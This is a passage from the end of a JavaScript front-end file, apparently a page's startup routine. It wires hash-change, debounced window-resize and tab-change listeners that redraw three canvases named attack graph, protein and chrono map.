  initMetaLoop();
  initEscrow();
  openFromHash();
  window.addEventListener('hashchange', openFromHash);

  // Canvases are sized from their CSS box, so they must redraw on resize.
  let resizeTimer = 0;
  window.addEventListener(
    'resize',
    () => {
      window.clearTimeout(resizeTimer);
      resizeTimer = window.setTimeout(() => {
        drawAttackGraph();
        drawProtein();
        drawChronoMap();
      }, 120);
    },
    { passive: true },
  );

  // The rail swaps panes; hidden canvases have no box, so redraw on show.
  document.querySelector('[data-tabs]')?.addEventListener('tabchange', () => {
    window.requestAnimationFrame(() => {
      drawAttackGraph();
      drawProtein();
      drawChronoMap();
    });
  });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', start, { once: true });
} else {
  start();
}
